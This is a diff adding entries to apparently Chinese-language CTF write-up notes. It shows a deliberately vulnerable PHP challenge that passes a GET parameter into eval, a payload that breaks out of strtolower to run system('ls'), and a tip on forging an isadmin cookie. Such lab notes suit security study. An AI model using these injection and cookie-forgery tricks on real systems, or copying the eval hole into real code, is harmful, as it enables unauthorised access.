@@ -199,4 +199,20 @@ insert into article(title,author,description,content,dateline) values('1'','1312
 [嘤嘤嘤]P4_3
 文件包含，但是没key
 [嘤嘤嘤]P4_4
-
+命令执行
+```
+<?php
+error_reporting(0);
+include "key4.php";
+$a=$_GET["a"];
+eval("\$o=strtolower(\"$a\");");
+echo $o;
+show_source(__FILE__);
+?>
+```
+构造
+`");system('ls');//`
+闭合strlower,注释后面的
+[嘤嘤嘤]P4_5
+改cookie，base64加密的名字和直接写cookie里的isadmin
+[嘤嘤嘤]P5_1
